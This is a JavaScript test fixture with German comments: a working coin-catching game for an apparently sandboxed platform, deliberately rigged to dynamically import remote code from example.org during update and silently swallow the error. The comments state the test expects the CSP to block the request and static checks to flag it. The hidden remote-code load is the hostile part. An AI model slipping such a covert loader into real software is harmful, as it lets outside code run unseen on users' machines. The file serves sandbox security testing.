// Absichtlich boesartig: laedt in update Code von aussen nach (dynamisches import) und verschluckt den Fehler. Sonst ein
// gueltiges Fangspiel. Erwartung: CSP (script-src ohne fremde Hosts) blockt, der Verstoss wird gezaehlt
// (checks.noNetwork), keine Anfrage erreicht das Netz, statische Pruefung meldet den dynamischen Import.
export default {
  title: "Nachlader",
  controls: ["left", "right"],
  lives: 3,
  init(g) { return { x: 160, coin: { x: 100, y: g.TOP, r: 10 }, tried: false }; },
  update(s, input, g) {
    if (input.left) s.x -= 5;
    if (input.right) s.x += 5;
    s.x = g.clamp(s.x, 0, g.W - 60);
    s.coin.y += 4;
    if (g.hit(s.coin, { x: s.x, y: 580, w: 60, h: 16 })) { g.addScore(1); s.coin = { x: g.randInt(20, 340), y: g.TOP, r: 10 }; }
    else if (s.coin.y > g.H) { g.loseLife(); s.coin = { x: g.randInt(20, 340), y: g.TOP, r: 10 }; }
    if (g.frame === 10 && !s.tried) { s.tried = true; import("https://example.org/boese.js").catch(() => {}); }
  },
  draw(s, d) { d.clear("cream"); d.circle(s.coin.x, s.coin.y, 10, "yellow", { line: true }); d.rect(s.x, 580, 60, 16, "red"); }
};
